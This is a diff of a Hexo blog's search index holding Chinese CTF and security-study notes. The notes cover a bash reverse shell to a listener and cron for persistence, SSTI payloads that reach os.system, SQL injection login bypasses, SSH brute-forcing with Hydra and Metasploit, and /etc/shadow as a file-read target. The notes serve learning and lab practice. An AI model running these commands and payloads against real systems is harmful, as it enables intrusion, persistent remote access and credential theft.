+    <content><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><span id="more"></span>
+
+<p><strong>监听服务端</strong></p>
+<p>使用netcat进行监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp +端口号(可任意设置未使用位置)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>反弹客户端</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/服务端ip地址/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-i  用户输入命令进行执行</span><br><span class="line"></span><br><span class="line">&gt;&amp;    将bash -i 交互执行结构 重定向(&gt;)并不做结果输出(&amp;)</span><br><span class="line"></span><br><span class="line">/dev/tcp/服务端ip地址/4444 基于TCP连接到 ip和端口位置</span><br><span class="line"></span><br><span class="line">0&gt;&gt;&amp;1    将获得输入重定向保存到输出中，这样监听端可获取输入与输出都显示的效果</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行完毕后不会进行任何输出，此时监听服务端得到反弹的shell连接。</p>
+<p>此时获得反弹服务端的shell，可执行任意命令。但是一旦客户端关闭shell窗口，此时连接中断。为了可持久反弹，可用定时任务。</p>
+<h4 id="linux定时任务"><a href="#linux定时任务" class="headerlink" title="linux定时任务"></a>linux定时任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于设置Linux进行周期性执行某种任务等某些事件的操作。类似windows下</span><br><span class="line">的计划任务。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在linux下可通过crontab进行计划任务的编写与浏览</p>
+<p><strong>1、查看当前用户的定时任务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>2、编辑任务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">*/1 * * * *+任务每分钟执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也可以在/var/spool/cron目录下 新建用户自定义的文件(以用户名命名)，编写计划任务。</p>
+<p>对于该命令是否执行，可通过/var/log/cron.log查看日志是否执行任务。</p>
+<p>如果没有日志记录，可编辑/etc/rsyslog.conf，将cron前的注释去掉，同时使用命令重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service rsyslog restart</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1279,6 +1318,22 @@
       </tags>
   </entry>
   <entry>
+    <title>Brute Force</title>
+    <url>/2021/01/10/Force/</url>
+    <content><![CDATA[<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
+<span id="more"></span>
+
+<ul>
+<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="/2021/01/10/Force/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="/2021/01/10/Force/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="/2021/01/10/Force/3.png"></li>
+<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
+<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="/2021/01/10/Force/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>暴力破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP基础</title>
     <url>/2020/11/06/PHP/</url>
     <content><![CDATA[<h3 id="基本的PHP语法"><a href="#基本的PHP语法" class="headerlink" title="基本的PHP语法"></a>基本的PHP语法</h3><?php
@@ -1379,61 +1434,6 @@ EOF;
 <h4 id="利用commands进行命令执行"><a href="#利用commands进行命令执行" class="headerlink" title="利用commands进行命令执行"></a>利用commands进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>参考：<a href="https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux-基础知识</title>
-    <url>/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><span id="more"></span>
-
-<p><strong>监听服务端</strong></p>
-<p>使用netcat进行监听端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp +端口号(可任意设置未使用位置)</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>反弹客户端</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/服务端ip地址/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-i  用户输入命令进行执行</span><br><span class="line"></span><br><span class="line">&gt;&amp;    将bash -i 交互执行结构 重定向(&gt;)并不做结果输出(&amp;)</span><br><span class="line"></span><br><span class="line">/dev/tcp/服务端ip地址/4444 基于TCP连接到 ip和端口位置</span><br><span class="line"></span><br><span class="line">0&gt;&gt;&amp;1    将获得输入重定向保存到输出中，这样监听端可获取输入与输出都显示的效果</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>执行完毕后不会进行任何输出，此时监听服务端得到反弹的shell连接。</p>
-<p>此时获得反弹服务端的shell，可执行任意命令。但是一旦客户端关闭shell窗口，此时连接中断。为了可持久反弹，可用定时任务。</p>
-<h4 id="linux定时任务"><a href="#linux定时任务" class="headerlink" title="linux定时任务"></a>linux定时任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于设置Linux进行周期性执行某种任务等某些事件的操作。类似windows下</span><br><span class="line">的计划任务。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>在linux下可通过crontab进行计划任务的编写与浏览</p>
-<p><strong>1、查看当前用户的定时任务</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>2、编辑任务</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">*/1 * * * *+任务每分钟执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>也可以在/var/spool/cron目录下 新建用户自定义的文件(以用户名命名)，编写计划任务。</p>
-<p>对于该命令是否执行，可通过/var/log/cron.log查看日志是否执行任务。</p>
-<p>如果没有日志记录，可编辑/etc/rsyslog.conf，将cron前的注释去掉，同时使用命令重启服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service rsyslog restart</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1542,34 +1542,6 @@ EOF;
       </tags>
   </entry>
   <entry>
-    <title>ctf之任意文件读取漏洞总结</title>
-    <url>/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>   下面是对任意文件漏洞读取的简单总结：</p>
-<span id="more"></span>
-
-<h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
-<p><em><strong>文件读取函数：</strong></em></p>
-<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
-<p><em><strong>文件包含相关函数：</strong></em></p>
-<p><em><strong>include、require、include_once、require_once</strong></em></p>
-<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
-<p><em><strong>system、exec</strong></em></p>
-<p><em><strong>还有php伪协议读取文件</strong></em></p>
-<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
-<p><em><strong>os.path.join()函数</strong></em></p>
-<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
-<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
-<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
-<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
-<p><em><strong>/etc/passwd</strong></em></p>
-<p><em><strong>/etc/shadow</strong></em></p>
-<p><em><strong>等等</strong></em></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctf之信息收集总结</title>
     <url>/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><h5 id="git常规泄露"><a href="#git常规泄露" class="headerlink" title="git常规泄露"></a>git常规泄露</h5><p>工具：</p>
@@ -1635,6 +1607,34 @@ EOF;
 <p>2、使用已有工具</p>
 <p><strong>Wappalyzer工具</strong></p>
 <p>除了使用工具，还可以随意输入一些参数，可能会出现404或302跳转出一些信息。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf之任意文件读取漏洞总结</title>
+    <url>/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>   下面是对任意文件漏洞读取的简单总结：</p>
+<span id="more"></span>
+
+<h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
+<p><em><strong>文件读取函数：</strong></em></p>
+<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
+<p><em><strong>文件包含相关函数：</strong></em></p>
+<p><em><strong>include、require、include_once、require_once</strong></em></p>
+<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
+<p><em><strong>system、exec</strong></em></p>
+<p><em><strong>还有php伪协议读取文件</strong></em></p>
+<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
+<p><em><strong>os.path.join()函数</strong></em></p>
+<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
+<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
+<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
+<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
+<p><em><strong>/etc/passwd</strong></em></p>
+<p><em><strong>/etc/shadow</strong></em></p>
+<p><em><strong>等等</strong></em></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1841,6 +1841,24 @@ EOF;
       </tags>
   </entry>
   <entry>
+    <title>Weak Password Burst</title>
+    <url>/2021/01/24/wepd/</url>
+    <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
+20:ssh 80:http
+</code></pre>
+<span id="more"></span>
+
+<h4 id="SSH爆破之字典"><a href="#SSH爆破之字典" class="headerlink" title="SSH爆破之字典"></a>SSH爆破之字典</h4><ul>
+<li>Cewl制作字典<br><code>cewl -d 2 -m 5 -w word.txt 网址</code><br>根据提供信息，随机生成一套弱口令密码,密码制作网站:<br><a href="https://bugku.com/mima/">https://bugku.com/mima/</a> <h4 id="Hydra爆破SSH"><a href="#Hydra爆破SSH" class="headerlink" title="Hydra爆破SSH"></a>Hydra爆破SSH</h4>kali自带<br>hydra -I 用户名(-L 用户名字典) -p 密码(-P word.txt) 网址 -s 端口(开放状态) ssh -f(找到一个终止)<h4 id="MSF模块爆破SSH"><a href="#MSF模块爆破SSH" class="headerlink" title="MSF模块爆破SSH"></a>MSF模块爆破SSH</h4><code>search login</code>关于登陆相关模块<br><code>use auxiliary/scanner/ssh/ssh_login</code><br><code>set rhosts 目标ip</code><br><code>set rport 端口</code><br><code>set username root</code><br><code>set pass_file/root/Desktop/word.txt</code><br><code>set threads 10</code><br><code>run</code><h4 id="Hydra爆破RDP-远程桌面协议"><a href="#Hydra爆破RDP-远程桌面协议" class="headerlink" title="Hydra爆破RDP(远程桌面协议)"></a>Hydra爆破RDP(远程桌面协议)</h4>爆破电脑解锁密码<h4 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h4></li>
+</ul>
+<p>御剑RDP爆破工具<br>超级弱口令检查工具</p>
+<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>之前就使用过很多了，补充一些不知道的功能。<br>Pitchfork(叉子模式)<br>设置几组变量，就有几组payload，请求数量是最小payload组中的payload数量。<br>Cluster bomb(炸弹模式)<br>与鱼叉类似，不过不是一一对应，而是一对多，循环搭配组合，请求数量是各payload数量的乘积。</p>
+]]></content>
+      <tags>
+        <tag>暴力破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS</title>
     <url>/2021/01/08/xss/</url>
     <content><![CDATA[<p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
@@ -1858,24 +1876,6 @@ EOF;
 ]]></content>
       <tags>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weak Password Burst</title>
-    <url>/2021/01/24/wepd/</url>
-    <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
-20:ssh 80:http
-</code></pre>
-<span id="more"></span>
-
-<h4 id="SSH爆破之字典"><a href="#SSH爆破之字典" class="headerlink" title="SSH爆破之字典"></a>SSH爆破之字典</h4><ul>
-<li>Cewl制作字典<br><code>cewl -d 2 -m 5 -w word.txt 网址</code><br>根据提供信息，随机生成一套弱口令密码,密码制作网站:<br><a href="https://bugku.com/mima/">https://bugku.com/mima/</a> <h4 id="Hydra爆破SSH"><a href="#Hydra爆破SSH" class="headerlink" title="Hydra爆破SSH"></a>Hydra爆破SSH</h4>kali自带<br>hydra -I 用户名(-L 用户名字典) -p 密码(-P word.txt) 网址 -s 端口(开放状态) ssh -f(找到一个终止)<h4 id="MSF模块爆破SSH"><a href="#MSF模块爆破SSH" class="headerlink" title="MSF模块爆破SSH"></a>MSF模块爆破SSH</h4><code>search login</code>关于登陆相关模块<br><code>use auxiliary/scanner/ssh/ssh_login</code><br><code>set rhosts 目标ip</code><br><code>set rport 端口</code><br><code>set username root</code><br><code>set pass_file/root/Desktop/word.txt</code><br><code>set threads 10</code><br><code>run</code><h4 id="Hydra爆破RDP-远程桌面协议"><a href="#Hydra爆破RDP-远程桌面协议" class="headerlink" title="Hydra爆破RDP(远程桌面协议)"></a>Hydra爆破RDP(远程桌面协议)</h4>爆破电脑解锁密码<h4 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h4></li>
-</ul>
-<p>御剑RDP爆破工具<br>超级弱口令检查工具</p>
-<h4 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h4><p>之前就使用过很多了，补充一些不知道的功能。<br>Pitchfork(叉子模式)<br>设置几组变量，就有几组payload，请求数量是最小payload组中的payload数量。<br>Cluster bomb(炸弹模式)<br>与鱼叉类似，不过不是一一对应，而是一对多，循环搭配组合，请求数量是各payload数量的乘积。</p>
-]]></content>
-      <tags>
-        <tag>暴力破解</tag>
       </tags>
   </entry>
   <entry>
@@ -1911,6 +1911,19 @@ EOF;
       <tags>
         <tag>PHP伪协议</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>博客优化</title>
+    <url>/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><span id="more"></span>
+
+<p>—第一步：git clone <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
+<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
+<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
+<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
+<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
+<p>—-author：xxx</p>
+]]></content>
   </entry>
   <entry>
     <title>攻防学习</title>
@@ -1955,19 +1968,6 @@ EOF;
       <tags>
         <tag>攻防世界</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>博客优化</title>
-    <url>/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
-    <content><![CDATA[<h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><span id="more"></span>
-
-<p>—第一步：git clone <a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
-<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
-<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
-<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
-<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
-<p>—-author：xxx</p>
-]]></content>
   </entry>
   <entry>
     <title>sqli-labs11~16</title>
@@ -2167,6 +2167,28 @@ Referer:发出请求的页面的URI。
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs46~53</title>
+    <url>/2020/12/14/sqli-labs/46/</url>
+    <content><![CDATA[<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>order by 注入</p>
+<span id="more"></span>
+
+<p><img src="/2020/12/14/sqli-labs/46/00.png"><br>从题目看出与order by有关。<br>而且参数也换成了sort。<br>输入后，出现一个表格。<br>尝试sort=1 asc和sort=1 desc，分别显示升序和降序的表格，说明此处是注入点，即注入点在order by后的参数中，<br><img src="/2020/12/14/sqli-labs/46/0.png"></p>
+<p><img src="/2020/12/14/sqli-labs/46/1.png"><br>了解一下order by怎么注入？<br>order by 后面的数字可以作为一个注入点，我们尝试报错注入成功。<br><img src="/2020/12/14/sqli-labs/46/2.png"></p>
+<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>加单引号即可。</p>
+<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>没有报错的，采用时间盲注成功。</p>
+<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>加单引号即可。</p>
+<h3 id="Less-51-53"><a href="#Less-51-53" class="headerlink" title="Less-51~53"></a>Less-51~53</h3><p>排序堆叠注入。<br>eg:<br><img src="/2020/12/14/sqli-labs/46/3.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>靶场到这边就刷完了，来小小总结一下。</p>
+<h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><p>漏洞类型分为两种：<strong>字符型，数字型。</strong></p>
+<h4 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="判断是否存在sql注入"></a>判断是否存在sql注入</h4><p>最经典的：<strong>加单引号</strong>，无论是字符型还是数字型都会报错，页面显示异常。<br>字符型：通过and’1’=’1 和and’1’=’2<br>如果第一个页面显示正常，第二个无正常显示，则存在字符型sql注入，因为sql语句可以被执行，程序没有对敏感字符过滤。<br>数字型：1=1 和1=2进行判断，同上。</p>
+<h4 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h4><p>工具注入：最省力，sqlmap可以快速爆出数据，但缺点是大多数时候即使存在sql注入，也爆不出来。<br>还有写python盲注脚本。<br><strong>手工注入：联合查询注入<br>    报错注入(三种方法)<br>    盲注(布尔盲注，时间盲注)<br>    堆叠注入(加;再多构造一句sql语句注入)<br>    二次注入(通过创建同名加特殊字符加过滤实现对原用户的密码进行修改)利用相关修改密码sql语句。<br>    双写大小写绕过注入<br>    写入一句话木马<br>    双服务器过滤(通过&amp;再构造一个参数绕过)<br>    宽字节注入</strong><br><em>这里只是一个大概，感觉刷靶场花费的时间感觉还是太长，没有适应这种学习方式，也仅仅是刚刚开始，希望后续的学习能逐渐提高…</em> 
+    </p>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs38~45</title>
     <url>/2020/12/12/sqli-labs/38/</url>
     <content><![CDATA[<h3 id="读文件——DNSLOG外带"><a href="#读文件——DNSLOG外带" class="headerlink" title="读文件——DNSLOG外带"></a>读文件——DNSLOG外带</h3><p>使用网站<a href="http://dnslog.cn/">http://dnslog.cn/</a></p>
@@ -2184,28 +2206,6 @@ Referer:发出请求的页面的URI。
 <h3 id="43"><a href="#43" class="headerlink" title="43"></a>43</h3><p>改成’)即可。</p>
 <h3 id="44"><a href="#44" class="headerlink" title="44"></a>44</h3><p>这一关没有报错信息，盲注</p>
 <h3 id="45"><a href="#45" class="headerlink" title="45"></a>45</h3><p>也没有报错信息，可以盲注<br>看了大佬博客，以上关卡，也是堆叠注入类型的，通过在password上构造payload，这里不再赘述。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs46~53</title>
-    <url>/2020/12/14/sqli-labs/46/</url>
-    <content><![CDATA[<h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><p>order by 注入</p>
-<span id="more"></span>
-
-<p><img src="/2020/12/14/sqli-labs/46/00.png"><br>从题目看出与order by有关。<br>而且参数也换成了sort。<br>输入后，出现一个表格。<br>尝试sort=1 asc和sort=1 desc，分别显示升序和降序的表格，说明此处是注入点，即注入点在order by后的参数中，<br><img src="/2020/12/14/sqli-labs/46/0.png"></p>
-<p><img src="/2020/12/14/sqli-labs/46/1.png"><br>了解一下order by怎么注入？<br>order by 后面的数字可以作为一个注入点，我们尝试报错注入成功。<br><img src="/2020/12/14/sqli-labs/46/2.png"></p>
-<h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>加单引号即可。</p>
-<h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>没有报错的，采用时间盲注成功。</p>
-<h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>加单引号即可。</p>
-<h3 id="Less-51-53"><a href="#Less-51-53" class="headerlink" title="Less-51~53"></a>Less-51~53</h3><p>排序堆叠注入。<br>eg:<br><img src="/2020/12/14/sqli-labs/46/3.png"></p>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>靶场到这边就刷完了，来小小总结一下。</p>
-<h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><p>漏洞类型分为两种：<strong>字符型，数字型。</strong></p>
-<h4 id="判断是否存在sql注入"><a href="#判断是否存在sql注入" class="headerlink" title="判断是否存在sql注入"></a>判断是否存在sql注入</h4><p>最经典的：<strong>加单引号</strong>，无论是字符型还是数字型都会报错，页面显示异常。<br>字符型：通过and’1’=’1 和and’1’=’2<br>如果第一个页面显示正常，第二个无正常显示，则存在字符型sql注入，因为sql语句可以被执行，程序没有对敏感字符过滤。<br>数字型：1=1 和1=2进行判断，同上。</p>
-<h4 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h4><p>工具注入：最省力，sqlmap可以快速爆出数据，但缺点是大多数时候即使存在sql注入，也爆不出来。<br>还有写python盲注脚本。<br><strong>手工注入：联合查询注入<br>    报错注入(三种方法)<br>    盲注(布尔盲注，时间盲注)<br>    堆叠注入(加;再多构造一句sql语句注入)<br>    二次注入(通过创建同名加特殊字符加过滤实现对原用户的密码进行修改)利用相关修改密码sql语句。<br>    双写大小写绕过注入<br>    写入一句话木马<br>    双服务器过滤(通过&amp;再构造一个参数绕过)<br>    宽字节注入</strong><br><em>这里只是一个大概，感觉刷靶场花费的时间感觉还是太长，没有适应这种学习方式，也仅仅是刚刚开始，希望后续的学习能逐渐提高…</em> 
-    </p>
 ]]></content>
       <tags>
